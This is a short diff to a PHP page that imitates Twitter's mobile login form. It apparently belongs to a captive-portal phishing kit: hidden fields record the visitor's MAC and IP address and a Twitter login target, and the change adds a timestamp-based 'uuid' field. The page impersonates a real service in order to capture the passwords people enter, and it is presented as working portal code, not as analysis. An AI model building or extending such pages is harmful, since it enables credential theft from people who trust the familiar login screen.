@@ -144,6 +144,7 @@ require_once('helper.php');
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
             <input type="hidden" name="target" value="https://mobile.twitter.com/login">
+            <input type="hidden" name="uuid" value="<?=date('H:i:s');echo '-';echo rand(1,10);?>">
             <button class="btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Log in</button>
             <div class="text-center terms-text1"><a href="#" class="url-color">Forgot Password?</a> · <a href="#" class="url-color">Sign up for Twitter</a></div><br>
 
